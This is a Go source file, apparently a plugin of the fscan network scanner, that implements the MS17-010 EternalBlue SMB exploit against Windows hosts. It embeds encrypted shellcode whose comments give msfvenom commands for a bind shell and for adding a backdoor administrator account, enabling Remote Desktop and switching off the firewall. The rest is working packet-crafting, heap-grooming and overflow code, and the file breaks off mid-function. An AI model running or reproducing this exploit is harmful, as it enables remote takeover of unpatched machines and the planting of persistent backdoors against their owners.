package Plugins

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"github.com/shadow1ng/fscan/common"
	"io"
	"io/ioutil"
	"net"
	"strings"
	"time"
)



func MS17010EXP(info *common.HostInfo) {
	address := info.Host + ":445"
	var sc string
	var sc_enc string
	switch common.SC {
	case "bind":
		//msfvenom -p windows/x64/shell/bind_tcp LPORT=65432 -f hex
		sc_enc = "aZ6HT8SGMKV04q20dOnyPK9qjjUZ4mq6l9SOxMKj0K7Uyq/ugxauU7KF3KrLhSUqfHkXdTU4C9iecU7qY5AjzF8Pe91258pbPpDJ/2FqrW4XD7RODvAKmJ175YEyRo+y0hV7aav0aa5wcpm6psV6Soq8vx8Q83fR2xSvTRtJMo96dZxCUWmuzZUF+91sYw4O3OeV/EzhZ40yJ2FGUovIJnDmsX8Vn/va3V5OONhmpXJYnrjj4QuFPkEpZi6nmhdr1gmzMq7YNP0aphUjlWuczX8v5ug6ZslVGuPjeYYonaAWKiNU2xPb8U2BuXPFEyG2PF5B8Q/XDhRKMX717QmAYX1kBeJClPPLiHV8uybI54m7t3S3JoFIO196MOFaWlFv+X+scB55bIKqtczndrWohujiJMKguyBfkdDmMvJ+NIoYmTJB+jf75S/HXQgHjCOZH9ARHyVkiYgT7WvFTxSP+qfNdbHIWK+uduT6nkCPHW7mxdlNR0fkncCpMPuR43kvtL4uUfCEmNufuZrLxr3kHeW8g1u9qLh2tq+w3qYBsIfJ7iYA3bDlpk751b8MJ+azvwK1/a/l0MXuSVMTbWMeKKefuwVmAUp5T7k8mWpA7+cu201DckYUQWaAW/p6YehYPMJ0b6kTV2LocHJinCQjAXCxa5YDCnqz6tVFtS7X0vreELXwXT6zqcs/W3xxfj3oVFgYsnwpTSa+d8A241ZJsz/0hhyIPE8LCi3+PeVvUwv7BJgIvJWdXd4CHx6y+QLiiNb8h2fyIt3e3v4pQFfvklhgXeCzCrA0dqiyMNR+W6NR3QAWQdhEKjkFPPzWYTB9q7mhToXAQSZgDw0eHEDpEudbYUalPlX3p83Wc2YS+lvr73uuhZ0VVTq/JWgmt/xZtfvKvZMYCG6UhayCyJyVperD2PP+dd99rUNa7dE6tKTflw0NMF0/zSFohby6fJoq1HxYLBScpi/d9qG/rKexovoUjsK7HtNQ/SI3cDQ6/qpOa54aBJHPf1+FrraaY/aKBOFBstNJkBTGGMEGW02kEmujZMJBhztUFwmvtXGoiOGK2jIGpamFg/dhAvnBDzkFzSMMKpxNo+1se2QzSNO59B66SGDd4bdUKEFzlvXGb/ZwtR1MVjINu0PpxKOmm72u/sfA2/cPe/bhdeP4+I3wSQjJavIHu8VBbneJrcj3BOFyMCI2ZL4FX9Qtefd8pnoBmli5bD9UqB4C9MYPj+gg3LBr5HX9Rr/qfDsjC/GyjOyJp3yLRK1WlLQqNuGmOHWggXbaWKrnO3swXHXkTlCfUWrCkdgdk9enytJZa6O5/6GzHi1/TDxRv/BZoUj+H4d6"
		sc = AesDecrypt(sc_enc,key)

	case "cs":
		//cs gen C shellcode -> fmt.Printf("%x", c) -> hex
		sc = ""
	case "add":
		//msfvenom -p windows/x64/exec EXITFUNC=thread CMD='cmd.exe /c net user sysadmin "1qaz@WSX!@#4" /ADD && net localgroup Administrators sysadmin /ADD && REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f && netsh advfirewall set allprofiles state off' -f hex
		sc_enc = "+w7eqC9F3rooElUlkRIf1tMg3KRpITKJdr1gjhO38bzwuDjLOdukKCR3Std9dzwcUZMUISTfilK/XkPhSjGFe63XGjDnZdr6b+IrB6CRbO/PYUJd7c7xKFKhr52DJFts/m4RHW6Ka0k/j8OqO9VmI75ze6A34QXtTLgV+zzPNImjzCeY5Cf4h0VZI32v280faebVOUFZ77v4OJMnDad4S1/fpbDLeHObigG5K9lzmZfvBGz+PySW2YONb3lBPlAtO1jD62ySX/Nj2Jec/QKmDxQuryEvlAgU0bZxV6Z1XCdJO+HLMLrxu1AhuGp/BsXzoixhUjWPBBJMeyPe+EiAtn27pwI2QCinBqMuK/mYW96Pf+qW4y4X001+dzp8snb76BRFqbsV+Wh0Ot5ctEqyCrI5gfP5rWCqjgqLHdTWNKWCeE9aZs6Lxl6J6f6XMoFKJ/b/Xc279ak+zJcdzi+BGHNCnlFGR+SZtVVm3ASYmw0OzRmbztyt4DRcxlRV+7EFdsGzerbdLz+hoURk6tUBluSfV2yo+qch/QJ7CXRgFR5STd+9Emj3zNAg8LLK7u/lv8tr0GCcAC0BMdozPnCzj/AkWidL7/1xojCdQ8s3stm0Dn8YTo6RX3GcPIduoIo2ge4KP6ADvAsQ8pekrUTkmC3pNGT3hDiT2Li84GQ0BhQqih7BItuE4hpHwGhnq+6ij9AGS3xdBS/NqODMU54WOeoqUrSp+nLN9n61qbXHr83q1PmNJFYJ5ptNobeicwWcHxZADHpT3O8KU5H9nsYNfnlABv1FGA2tgWaZjA4iqgzNGQF2dnFWAxUIxwaF3C+DLrvu8WONZaEYlnI7THq/xxGitHt8OnN5AY8FKU8zq6FQt4kRfOm5TO4pACbSKm/9n7EOXZ78GuMYeFaW56xqdJjFsbHvi8yJLIn9hOBjoSPL6Hg+cNijhayKMUc7rtLiqQd81kPaX7xDMusufsiekIySeWjWXZlQt+0tBveK56zzUGJIjAFaKK+VtPZcRyoFiU598OeS0ZPO3UP+nKi0uvhTEnT7KBjE4xAEHvX41P3u9lJIeaIewbqgsHgDSOrU1StCfqT+xO5Ltyy+1e2jDT2H2nquN9BGvdfxsNaGYnsodliKpmL77LsZAFdXyiiAu1Xb5DJhwJGO1Zi156HMC3tGWer5SF5M5H/ufENNxds632lqew2C7dkgLuEMDr+URldG2JMozhHc0u1VkqqlrbVEqnjNU+4D0Gne9pCVd06UhrrRDO6DdfFaYAfp+rz0EURo6CSoMsVIkJETPaVEhHD1qDi7S4p98Mu8aYnzBQpf9uUULrI3UQWHsGfG7iXVLCPwX6zUVE5LYb7JUsAFxvdoGbHjUMOJXGfM4HMQXB1PXXzQmyvLGDLNeLJ71EgE"
		sc = AesDecrypt(sc_enc,key)

	case "guest":
		//msfvenom -p windows/x64/exec EXITFUNC=thread CMD='cmd.exe /c net user Guest /active:yes && net user Guest "1qaz@WSX!@#4" && net localgroup Administrators Guest /ADD && REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f && netsh advfirewall set allprofiles state off' -f hex
		sc_enc = "aZ6HT8SGMKV04q20dOnyPK9qjjUZ4mq6l9SOxMKj0K4lzrg1xPglYpF+v97tP3F9ViX/X44PY0NKKhJgtlWMAYV+lsvIrCyxdhxk+venYJW8R0Cw5vTbuaXlnWmba2ZbUrnZpoJVfJpJNjBnTNFkedK3LCFYLyPBJtwbaT5azGUmO0pkOtGthnPx4C5eUhplZihuJAD/pNtcJ71o/rLkw+JH0Mz+5DzN5T+dbAi8LuBtGMYBaVRtSVrZ+ZZtWEf8ZT1UIMD7druVl+elrJ5LBgcUU9hdH61cPUYgsPaytwxOG9BCJKasdW++NthXGlR6vO0JtJUHnYuFm1saHOkSYAn5U96LkAMYIZ78P7M2upUKnOah/ND5W06yW8oYdGVq7ACsyjrf8UNkVSpedg9EMRwKBJi2wEAzfUkl+USH7gOhbzm2D/ctz2CZEldptuu25jppiVqe2v7MKSRkp1WVipAywemUjZZ9OfDY+jOD6dB5w+vDy++7YJuwtK1ANdUVHhhgxHbfV/2/EtKrm76y/PJTGxTVObnJcajrP5mRy/7hDDo/i+sreXD92TQc1qbEvfi/7oJLy4OTvdTt1/tfSdr9pnQZPqD6gIgSHUvKb1McLL8JS3VgUMW5aSV+7CIAAIPrn+G4B6hH1+Bb0z0AIEnciCml2GUXj56fGwCT9rH7ONKpgwWYxmFi5qFF2Znts/UOsPGXWnOjW7fbX5YdkqfbsbNdfy69eRVi6xqRJ0gJU7GHoyl9mWqGz2VcRe1tU6BusAVe3vEToCtgUpCltPKk8Bci3P86mlzDRGpnFMXtvBf+4/BvAPRy3SgbddGcBq/TR+kol420b5Vk5qKs5dwtOrMp0V99VqfyxriqUSB42oA3gNlaSbwcttQzXX918DAgBlHIrVO+QaOQNBkTdvNLPWT1slW62jNjtmQz63TFrlz5qRmjE0tOPquZxB9z0NGqhLkG2vHfPmCMG2g9vHpXCDoKeVB0Hf2Air5MMPr8I426/DTHIQMMxMyC0IRz0MAcXh7W0Je5S42F2dfTc4VOnScCFUrlzLJw9QxyoDN6XJyr54Lu+GGhS+pDPwKLhhs+CK5Crl2CYLqMG1AoSrveY7+okMIYUhinXuC9V80SYDUXWg3E+PH34ULftgsemNhLmY2VxlO6vDZu28cRybrB6wvt0yeOECzYMIwrRCD73s+nIclbiiynBl7EfNo1ICwzpVMalHum11OObK7zBC7Wu/dAnoj0fs5phgoh9TNpmNDZRPWnT/SxoBOau6TZKAq/wiTyXbfRmL10jWmKnnVdr264863of/jiKm9X/RqMCrt9ECrX6XJckSAxFSry"
		sc = AesDecrypt(sc_enc,key)
		

	default:
		if strings.Contains(common.SC, "file:") {
			read, err := ioutil.ReadFile(common.SC[5:])
			if err != nil {
				errlog := fmt.Sprintf("[-] ms17010 sc readfile %v error: %v", common.SC, err)
				common.LogError(errlog)
				return
			}
			sc = fmt.Sprintf("%x", read)
		} else {
			sc = common.SC
		}
	}

	if len(sc) < 20 {
		fmt.Println("[-] no such sc")
		return
	}

	sc1, err := hex.DecodeString(sc)
	if err != nil {
		common.LogError("[-] " + info.Host + " MS17-010 shellcode decode error " + err.Error())
		return
	}
	err = eternalBlue(address, 12, 12, sc1)
	if err != nil {
		common.LogError("[-] " + info.Host + " MS17-010 exp failed " + err.Error())
		return
	}
	common.LogSuccess("[*] " + info.Host + "\tMS17-010\texploit end")
}

func eternalBlue(address string, initialGrooms, maxAttempts int, sc []byte) error {
	// check sc size
	const maxscSize = packetMaxLen - packetSetupLen - len(loader) - 2 // uint16
	l := len(sc)
	if l > maxscSize {
		//fmt.Println(maxscSize)
		return fmt.Errorf("sc size %d > %d big %d", l, maxscSize, l-maxscSize)
	}
	payload := makeKernelUserPayload(sc)
	var (
		grooms int
		err    error
	)
	for i := 0; i < maxAttempts; i++ {
		grooms = initialGrooms + 5*i
		err = exploit(address, grooms, payload)
		if err == nil {
			return nil
		}
	}
	return err
}

func exploit(address string, grooms int, payload []byte) error {
	// connect host
	header, conn, err := smb1AnonymousConnectIPC(address)
	if err != nil {
		return err
	}
	defer func() { _ = conn.Close() }()
	// send SMB1 large buffer
	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	err = smb1LargeBuffer(conn, header)
	if err != nil {
		return err
	}
	// initialize groom threads
	fhsConn, err := smb1FreeHole(address, true)
	if err != nil {
		return err
	}
	defer func() { _ = fhsConn.Close() }()
	// groom socket
	groomConns, err := smb2Grooms(address, grooms)
	if err != nil {
		return err
	}
	fhfConn, err := smb1FreeHole(address, false)
	if err != nil {
		return err
	}
	_ = fhsConn.Close()
	// grooms
	groomConns2, err := smb2Grooms(address, 6)
	if err != nil {
		return err
	}
	_ = fhfConn.Close()
	groomConns = append(groomConns, groomConns2...)
	defer func() {
		for i := 0; i < len(groomConns); i++ {
			_ = groomConns[i].Close()
		}
	}()

	//fmt.Println("Running final exploit packet")
	err = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		return err
	}
	treeID := header.TreeID
	userID := header.UserID
	finalPacket := makeSMB1Trans2ExploitPacket(treeID, userID, 15, "exploit")
	_, err = conn.Write(finalPacket)
	if err != nil {
		return fmt.Errorf("failed to send final exploit packet: %s", err)
	}
	raw, _, err := smb1GetResponse(conn)
	if err != nil {
		return fmt.Errorf("failed to get response about exploit: %s", err)
	}
	ntStatus := make([]byte, 4)
	ntStatus[0] = raw[8]
	ntStatus[1] = raw[7]
	ntStatus[2] = raw[6]
	ntStatus[3] = raw[5]

	//fmt.Printf("NT Status: 0x%08X\n", ntStatus)

	//fmt.Println("send the payload with the grooms")

	body := makeSMB2Body(payload)

	for i := 0; i < len(groomConns); i++ {
		_, err = groomConns[i].Write(body[:2920])
		if err != nil {
			return err
		}
	}
	for i := 0; i < len(groomConns); i++ {
		_, err = groomConns[i].Write(body[2920:4073])
		if err != nil {
			return err
		}
	}
	return nil
}

func makeKernelUserPayload(sc []byte) []byte {
	// test DoublePulsar
	buf := bytes.Buffer{}
	buf.Write(loader[:])
	// write sc size
	size := make([]byte, 2)
	binary.LittleEndian.PutUint16(size, uint16(len(sc)))
	buf.Write(size)
	buf.Write(sc)
	return buf.Bytes()
}

func smb1AnonymousConnectIPC(address string) (*smbHeader, net.Conn, error) {
	conn, err := net.DialTimeout("tcp", address, 10*time.Second)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to connect host: %s", err)
	}
	var ok bool
	defer func() {
		if !ok {
			_ = conn.Close()
		}
	}()
	err = smbClientNegotiate(conn)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to negotiate: %s", err)
	}
	raw, header, err := smb1AnonymousLogin(conn)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to login with anonymous: %s", err)
	}
	_, err = getOSName(raw)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to get OS name: %s", err)
	}
	//fmt.Println("OS:", osName)
	header, err = treeConnectAndX(conn, address, header.UserID)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to tree connect AndX: %s", err)
	}
	ok = true
	return header, conn, nil
}

const smbHeaderSize = 32

type smbHeader struct {
	ServerComponent [4]byte
	SMBCommand      uint8
	ErrorClass      uint8
	Reserved        byte
	ErrorCode       uint16
	Flags           uint8
	Flags2          uint16
	ProcessIDHigh   uint16
	Signature       [8]byte
	Reserved2       [2]byte
	TreeID          uint16
	ProcessID       uint16
	UserID          uint16
	MultiplexID     uint16
}

func smb1GetResponse(conn net.Conn) ([]byte, *smbHeader, error) {
	// net BIOS
	buf := make([]byte, 4)
	_, err := io.ReadFull(conn, buf)
	if err != nil {
		const format = "failed to get SMB1 response about NetBIOS session service: %s"
		return nil, nil, fmt.Errorf(format, err)
	}
	typ := buf[0]
	if typ != 0x00 {
		const format = "invalid message type 0x%02X in SMB1 response"
		return nil, nil, fmt.Errorf(format, typ)
	}
	sizeBuf := make([]byte, 4)
	copy(sizeBuf[1:], buf[1:])
	size := int(binary.BigEndian.Uint32(sizeBuf))
	// SMB
	buf = make([]byte, size)
	_, err = io.ReadFull(conn, buf)
	if err != nil {
		const format = "failed to get SMB1 response about header: %s"
		return nil, nil, fmt.Errorf(format, err)
	}
	smbHeader := smbHeader{}
	reader := bytes.NewReader(buf[:smbHeaderSize])
	err = binary.Read(reader, binary.LittleEndian, &smbHeader)
	if err != nil {
		const format = "failed to parse SMB1 response header: %s"
		return nil, nil, fmt.Errorf(format, err)
	}
	return buf, &smbHeader, nil
}

func smbClientNegotiate(conn net.Conn) error {
	buf := bytes.Buffer{}

	// --------NetBIOS Session Service--------

	// message type
	buf.WriteByte(0x00)
	// length
	buf.Write([]byte{0x00, 0x00, 0x54})

	// --------Server Message Block Protocol--------

	// server_component: .SMB
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// smb_command: Negotiate Protocol
	buf.WriteByte(0x72)
	// NT status
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// flags
	buf.WriteByte(0x18)
	// flags2
	buf.Write([]byte{0x01, 0x28})
	// process_id_high
	buf.Write([]byte{0x00, 0x00})
	// signature
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// tree id
	buf.Write([]byte{0x00, 0x00})
	// process id
	buf.Write([]byte{0x2F, 0x4B})
	// user id
	buf.Write([]byte{0x00, 0x00})
	// multiplex id
	buf.Write([]byte{0xC5, 0x5E})

	// --------Negotiate Protocol Request--------

	// word_count
	buf.WriteByte(0x00)
	// byte_count
	buf.Write([]byte{0x31, 0x00})

	// dialect name: LAN MAN1.0
	buf.WriteByte(0x02)
	buf.Write([]byte{0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E,
		0x30, 0x00})

	// dialect name: LM1.2X002
	buf.WriteByte(0x02)
	buf.Write([]byte{0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30,
		0x32, 0x00})

	// dialect name: NT LAN MAN 1.0
	buf.WriteByte(0x02)
	buf.Write([]byte{0x4E, 0x54, 0x20, 0x4C, 0x41, 0x4E, 0x4D, 0x41,
		0x4E, 0x20, 0x31, 0x2E, 0x30, 0x00})

	// dialect name: NT LM 0.12
	buf.WriteByte(0x02)
	buf.Write([]byte{0x4E, 0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E,
		0x31, 0x32, 0x00})

	// send packet
	_, err := buf.WriteTo(conn)
	if err != nil {
		return err
	}
	_, _, err = smb1GetResponse(conn)
	return err
}

func smb1AnonymousLogin(conn net.Conn) ([]byte, *smbHeader, error) {
	buf := bytes.Buffer{}

	// --------NetBIOS Session Service--------

	// session message
	buf.WriteByte(0x00)
	// length
	buf.Write([]byte{0x00, 0x00, 0x88})

	// --------Server Message Block Protocol--------

	// SMB1
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Session Setup AndX
	buf.WriteByte(0x73)
	// NT SUCCESS
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// flags
	buf.WriteByte(0x18)
	// flags2
	buf.Write([]byte{0x07, 0xC0})
	// PID high
	buf.Write([]byte{0x00, 0x00})
	// Signature1
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Signature2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// TreeID
	buf.Write([]byte{0x00, 0x00})
	// PID
	buf.Write([]byte{0xFF, 0xFE})
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// user id
	buf.Write([]byte{0x00, 0x00})
	// multiplex id
	buf.Write([]byte{0x40, 0x00})

	// --------Session Setup AndX Request--------

	// word count
	buf.WriteByte(0x0D)
	// no further commands
	buf.WriteByte(0xFF)
	// reserved
	buf.WriteByte(0x00)
	// AndX offset
	buf.Write([]byte{0x88, 0x00})
	// max buffer
	buf.Write([]byte{0x04, 0x11})
	// max mpx count
	buf.Write([]byte{0x0A, 0x00})
	// VC Number
	buf.Write([]byte{0x00, 0x00})
	// session key
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// ANSI password length
	buf.Write([]byte{0x01, 0x00})
	// unicode password length
	buf.Write([]byte{0x00, 0x00})
	// reserved
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// capabilities
	buf.Write([]byte{0xD4, 0x00, 0x00, 0x00})
	// bytes count
	buf.Write([]byte{0x4b, 0x00})
	// ANSI password
	buf.WriteByte(0x00)
	// account name
	buf.Write([]byte{0x00, 0x00})
	// domain name
	buf.Write([]byte{0x00, 0x00})

	// native OS: Windows 2000 2195
	buf.Write([]byte{0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00,
		0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32})
	buf.Write([]byte{0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20,
		0x00, 0x32, 0x00, 0x31, 0x00, 0x39, 0x00, 0x35, 0x00})
	buf.Write([]byte{0x00, 0x00})

	// native LAN manager: Windows 2000 5.0
	buf.Write([]byte{0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00,
		0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32})
	buf.Write([]byte{0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20,
		0x00, 0x35, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x00, 0x00})

	// send packet
	_, err := buf.WriteTo(conn)
	if err != nil {
		return nil, nil, err
	}
	return smb1GetResponse(conn)
}

// skip smb header, word count, AndXCommand, Reserved,
// AndXOffset, Action, Byte count and a magic 0x41 (A)
func getOSName(raw []byte) (string, error) {
	osBuf := bytes.Buffer{}
	reader := bytes.NewReader(raw[smbHeaderSize+10:])
	char := make([]byte, 2)
	for {
		_, err := io.ReadFull(reader, char)
		if err != nil {
			return "", err
		}
		if bytes.Equal(char, []byte{0x00, 0x00}) {
			break
		}
		osBuf.Write(char)
	}
	osBufLen := osBuf.Len()
	osName := make([]byte, 0, osBufLen/2)
	b := osBuf.Bytes()
	for i := 0; i < osBufLen; i += 2 {
		osName = append(osName, b[i])
	}
	return string(osName), nil
}

func treeConnectAndX(conn net.Conn, address string, userID uint16) (*smbHeader, error) {
	buf := bytes.Buffer{}

	// --------NetBIOS Session Service--------

	// message type
	buf.WriteByte(0x00)
	// length, it will changed at the end of the function
	buf.Write([]byte{0x00, 0x00, 0x00})

	// --------Server Message Block Protocol--------

	// server component
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// smb command: Tree Connect AndX
	buf.WriteByte(0x75)
	// NT status
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// flags
	buf.WriteByte(0x18)
	// flags2
	buf.Write([]byte{0x01, 0x20})
	// process id high
	buf.Write([]byte{0x00, 0x00})
	// signature
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// tree id
	buf.Write([]byte{0x00, 0x00})
	// process id
	buf.Write([]byte{0x2F, 0x4B})
	// user id
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)
	// multiplex id
	buf.Write([]byte{0xC5, 0x5E})

	// --------Tree Connect AndX Request--------

	// word count
	buf.WriteByte(0x04)
	// AndXCommand: No further commands
	buf.WriteByte(0xFF)
	// reserved
	buf.WriteByte(0x00)
	// AndXOffset
	buf.Write([]byte{0x00, 0x00})
	// flags
	buf.Write([]byte{0x00, 0x00})
	// password length
	buf.Write([]byte{0x01, 0x00})
	// byte count
	buf.Write([]byte{0x1A, 0x00})
	// password
	buf.WriteByte(0x00)
	// IPC
	host, _, err := net.SplitHostPort(address)
	if err != nil {
		return nil, err
	}
	_, _ = fmt.Fprintf(&buf, "\\\\%s\\IPC$", host)
	// null byte after ipc added by kev
	buf.WriteByte(0x00)
	// service
	buf.Write([]byte{0x3F, 0x3F, 0x3F, 0x3F, 0x3F, 0x00})

	// update packet size
	b := buf.Bytes()
	sizeBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(sizeBuf, uint32(buf.Len()-4))
	copy(b[1:], sizeBuf[1:])

	// send packet
	_, err = buf.WriteTo(conn)
	if err != nil {
		return nil, err
	}
	_, header, err := smb1GetResponse(conn)
	return header, err
}

func smb1LargeBuffer(conn net.Conn, header *smbHeader) error {
	transHeader, err := sendNTTrans(conn, header.TreeID, header.UserID)
	if err != nil {
		return fmt.Errorf("failed to send nt trans: %s", err)
	}
	// initial trans2 request
	treeID := transHeader.TreeID
	userID := transHeader.UserID
	trans2Packet := makeSMB1Trans2ExploitPacket(treeID, userID, 0, "zero")
	// send all but the last packet
	for i := 1; i < 15; i++ {
		packet := makeSMB1Trans2ExploitPacket(treeID, userID, i, "buffer")
		trans2Packet = append(trans2Packet, packet...)
	}
	smb1EchoPacket := makeSMB1EchoPacket(treeID, userID)
	trans2Packet = append(trans2Packet, smb1EchoPacket...)

	_, err = conn.Write(trans2Packet)
	if err != nil {
		return fmt.Errorf("failed to send large buffer: %s", err)
	}
	_, _, err = smb1GetResponse(conn)
	return err
}

func sendNTTrans(conn net.Conn, treeID, userID uint16) (*smbHeader, error) {
	buf := bytes.Buffer{}

	// --------NetBIOS Session Service--------

	// message type
	buf.WriteByte(0x00)
	// length
	buf.Write([]byte{0x00, 0x04, 0x38})

	// --------Server Message Block Protocol--------

	// SMB1
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// NT Trans
	buf.WriteByte(0xA0)
	// NT success
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// flags
	buf.WriteByte(0x18)
	// flags2
	buf.Write([]byte{0x07, 0xC0})
	// PID high
	buf.Write([]byte{0x00, 0x00})
	// signature1
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// signature2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// tree id
	treeIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(treeIDBuf, treeID)
	buf.Write(treeIDBuf)
	// PID
	buf.Write([]byte{0xFF, 0xFE})
	// user id
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)
	// multiplex id
	buf.Write([]byte{0x40, 0x00})

	// --------NT Trans Request--------

	// word count
	buf.WriteByte(0x14)
	// max setup count
	buf.WriteByte(0x01)
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// total param count
	buf.Write([]byte{0x1E, 0x00, 0x00, 0x00})
	// total data count
	buf.Write([]byte{0xd0, 0x03, 0x01, 0x00})
	// max param count
	buf.Write([]byte{0x1E, 0x00, 0x00, 0x00})
	// max data count
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// param count
	buf.Write([]byte{0x1E, 0x00, 0x00, 0x00})
	// param offset
	buf.Write([]byte{0x4B, 0x00, 0x00, 0x00})
	// data count
	buf.Write([]byte{0xd0, 0x03, 0x00, 0x00})
	// data offset
	buf.Write([]byte{0x68, 0x00, 0x00, 0x00})
	// setup count
	buf.WriteByte(0x01)
	// function <unknown>
	buf.Write([]byte{0x00, 0x00})
	// unknown NT transaction (0) setup
	buf.Write([]byte{0x00, 0x00})
	// byte count
	buf.Write([]byte{0xEC, 0x03})
	// NT parameters
	buf.Write(makeZero(0x1F))
	// undocumented
	buf.WriteByte(0x01)
	buf.Write(makeZero(0x03CD))

	// send packet
	_, err := buf.WriteTo(conn)
	if err != nil {
		return nil, err
	}
	_, header, err := smb1GetResponse(conn)
	return header, err
}

func makeSMB1Trans2ExploitPacket(treeID, userID uint16, timeout int, typ string) []byte {
	timeout = timeout*0x10 + 3
	buf := bytes.Buffer{}

	// --------NetBIOS Session Service--------

	// message type
	buf.WriteByte(0x00)
	// length
	buf.Write([]byte{0x00, 0x10, 0x35})

	// --------Server Message Block Protocol--------
	// SMB1
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Trans2 request
	buf.WriteByte(0x33)
	// NT success
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// flags
	buf.WriteByte(0x18)
	// flags2
	buf.Write([]byte{0x07, 0xC0})
	// PID high
	buf.Write([]byte{0x00, 0x00})
	// signature1
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// signature2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// tree id
	treeIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(treeIDBuf, treeID)
	buf.Write(treeIDBuf)
	// PID
	buf.Write([]byte{0xFF, 0xFE})
	// user id
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)
	// multiplex id
	buf.Write([]byte{0x40, 0x00})

	// --------Trans2 Second Request--------

	// word count
	buf.WriteByte(0x09)
	// total param count
	buf.Write([]byte{0x00, 0x00})
	// total data count
	buf.Write([]byte{0x00, 0x10})
	// max param count
	buf.Write([]byte{0x00, 0x00})
	// max data count
	buf.Write([]byte{0x00, 0x00})
	// max setup count
	buf.WriteByte(0x00)
	// reserved
	buf.WriteByte(0x00)
	// flags
	buf.Write([]byte{0x00, 0x10})
	// timeouts
	buf.Write([]byte{0x35, 0x00, 0xD0})
	// timeout is a single int
	buf.WriteByte(byte(timeout))
	// reserved
	buf.Write([]byte{0x00, 0x00})
	// parameter count
	buf.Write([]byte{0x00, 0x10})

	switch typ {
	case "exploit":
		// overflow
		buf.Write(bytes.Repeat([]byte{0x41}, 2957))
		buf.Write([]byte{0x80, 0x00, 0xA8, 0x00})

		buf.Write(makeZero(0x10))
		buf.Write([]byte{0xFF, 0xFF})
		buf.Write(makeZero(0x06))
		buf.Write([]byte{0xFF, 0xFF})
		buf.Write(makeZero(0x16))

		// x86 addresses
		buf.Write([]byte{0x00, 0xF1, 0xDF, 0xFF})
		buf.Write(makeZero(0x08))
		buf.Write([]byte{0x20, 0xF0, 0xDF, 0xFF})

		// x64 addresses
		buf.Write([]byte{0x00, 0xF1, 0xDF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})

		buf.Write([]byte{0x60, 0x00, 0x04, 0x10})
		buf.Write(makeZero(0x04))

		buf.Write([]byte{0x80, 0xEF, 0xDF, 0xFF})

		buf.Write(makeZero(0x04))
		buf.Write([]byte{0x10, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
		buf.Write([]byte{0x18, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
		buf.Write(makeZero(0x10))

		buf.Write([]byte{0x60, 0x00, 0x04, 0x10})
		buf.Write(makeZero(0x0C))
		buf.Write([]byte{0x90, 0xFF, 0xCF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
		buf.Write(makeZero(0x08))
		buf.Write([]byte{0x80, 0x10})
		buf.Write(makeZero(0x0E))
		buf.WriteByte(0x39)
		buf.WriteByte(0xBB)

		buf.Write(bytes.Repeat([]byte{0x41}, 965))
	case "zero":
		buf.Write(makeZero(2055))
		buf.Write([]byte{0x83, 0xF3})

		buf.Write(bytes.Repeat([]byte{0x41}, 2039))
	default:
